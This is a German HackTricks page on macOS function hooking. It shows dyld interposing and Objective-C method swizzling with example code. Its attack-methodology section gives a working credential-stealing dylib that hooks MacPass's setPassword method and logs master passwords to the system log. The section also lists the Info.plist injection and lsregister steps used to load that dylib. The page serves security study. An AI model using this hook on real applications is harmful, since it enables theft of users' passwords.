# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Funktionseinfügung

Erstellen Sie eine **dylib** mit einem **`__interpose` (`__DATA___interpose`)** Abschnitt (oder einem Abschnitt, der mit **`S_INTERPOSING`** gekennzeichnet ist), der Tupel von **Funktionszeigern** enthält, die auf die **ursprünglichen** und die **Ersatz**-Funktionen verweisen.

Dann **injektieren** Sie die dylib mit **`DYLD_INSERT_LIBRARIES`** (die Einfügung muss erfolgen, bevor die Hauptanwendung geladen wird). Offensichtlich gelten die [**Einschränkungen** für die Verwendung von **`DYLD_INSERT_LIBRARIES`** auch hier](macos-library-injection/#check-restrictions).

### printf einfügen

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Die **`DYLD_PRINT_INTERPOSTING`** Umgebungsvariable kann verwendet werden, um das Interposing zu debuggen und wird den Interpose-Prozess ausgeben.

Beachten Sie auch, dass **Interposing zwischen dem Prozess und den geladenen Bibliotheken auftritt**, es funktioniert nicht mit dem Cache der gemeinsam genutzten Bibliotheken.

### Dynamisches Interposing

Jetzt ist es auch möglich, eine Funktion dynamisch mit der Funktion **`dyld_dynamic_interpose`** zu interposen. Dies ermöglicht es, eine Funktion zur Laufzeit programmgesteuert zu interposen, anstatt dies nur zu Beginn zu tun.

Es muss nur die **Tupel** der **zu ersetzenden Funktion und der Ersatzfunktion** angegeben werden.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

In ObjectiveC wird eine Methode so aufgerufen: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Es werden das **Objekt**, die **Methode** und die **Parameter** benötigt. Und wenn eine Methode aufgerufen wird, wird eine **Nachricht gesendet** mit der Funktion **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Das Objekt ist **`someObject`**, die Methode ist **`@selector(method1p1:p2:)`** und die Argumente sind **value1**, **value2**.

Folgend den Objektstrukturen ist es möglich, ein **Array von Methoden** zu erreichen, wo die **Namen** und **Zeiger** auf den Methodencode **lokalisiert** sind.

> [!CAUTION]
> Beachten Sie, dass Methoden und Klassen basierend auf ihren Namen zugegriffen werden, diese Informationen werden im Binärformat gespeichert, sodass sie mit `otool -ov </path/bin>` oder [`class-dump </path/bin>`](https://github.com/nygard/class-dump) abgerufen werden können.

### Zugriff auf die rohen Methoden

Es ist möglich, auf die Informationen der Methoden wie Name, Anzahl der Parameter oder Adresse zuzugreifen, wie im folgenden Beispiel:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling mit method_exchangeImplementations

Die Funktion **`method_exchangeImplementations`** ermöglicht es, die **Adresse** der **Implementierung** von **einer Funktion für die andere** zu **ändern**.

> [!CAUTION]
> Wenn eine Funktion aufgerufen wird, wird also **die andere ausgeführt**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> In diesem Fall könnte der **Implementierungscode der legitimen** Methode **überprüfen**, ob der **Methodenname** **übereinstimmt**, und dieses Swizzling **erkennen** und dessen Ausführung verhindern.
>
> Die folgende Technik hat diese Einschränkung nicht.

### Method Swizzling mit method_setImplementation

Das vorherige Format ist seltsam, da Sie die Implementierung von 2 Methoden gegeneinander ändern. Mit der Funktion **`method_setImplementation`** können Sie die **Implementierung** einer **Methode für die andere** **ändern**.

Denken Sie nur daran, die **Adresse der Implementierung der ursprünglichen** Methode zu **speichern**, wenn Sie sie aus der neuen Implementierung aufrufen möchten, bevor Sie sie überschreiben, da es später viel komplizierter sein wird, diese Adresse zu finden.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking-Angriffsmethodik

Auf dieser Seite wurden verschiedene Möglichkeiten zur Funktionshooking diskutiert. Sie beinhalteten jedoch **das Ausführen von Code innerhalb des Prozesses, um anzugreifen**.

Um dies zu tun, ist die einfachste Technik, die verwendet werden kann, das Injizieren eines [Dyld über Umgebungsvariablen oder Hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Ich nehme jedoch an, dass dies auch über [Dylib-Prozessinjektion](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) erfolgen könnte.

Beide Optionen sind jedoch **begrenzt** auf **unprotected** Binaries/Prozesse. Überprüfen Sie jede Technik, um mehr über die Einschränkungen zu erfahren.

Ein Funktionshooking-Angriff ist jedoch sehr spezifisch; ein Angreifer wird dies tun, um **sensible Informationen aus einem Prozess zu stehlen** (ansonsten würden Sie einfach einen Prozessinjektionsangriff durchführen). Und diese sensiblen Informationen könnten sich in von Benutzern heruntergeladenen Apps wie MacPass befinden.

Der Angreifer-Vektor wäre also, entweder eine Schwachstelle zu finden oder die Signatur der Anwendung zu entfernen, die **`DYLD_INSERT_LIBRARIES`**-Umgebungsvariable über die Info.plist der Anwendung einzufügen und etwas hinzuzufügen wie:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
und dann die Anwendung **neu registrieren**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Fügen Sie in dieser Bibliothek den Hooking-Code hinzu, um die Informationen zu exfiltrieren: Passwörter, Nachrichten...

> [!CAUTION]
> Beachten Sie, dass in neueren Versionen von macOS, wenn Sie die **Signatur** der Anwendungsbinärdatei entfernen und sie zuvor ausgeführt wurde, macOS die **Anwendung nicht mehr ausführen wird**.

#### Bibliotheksbeispiel
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referenzen

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
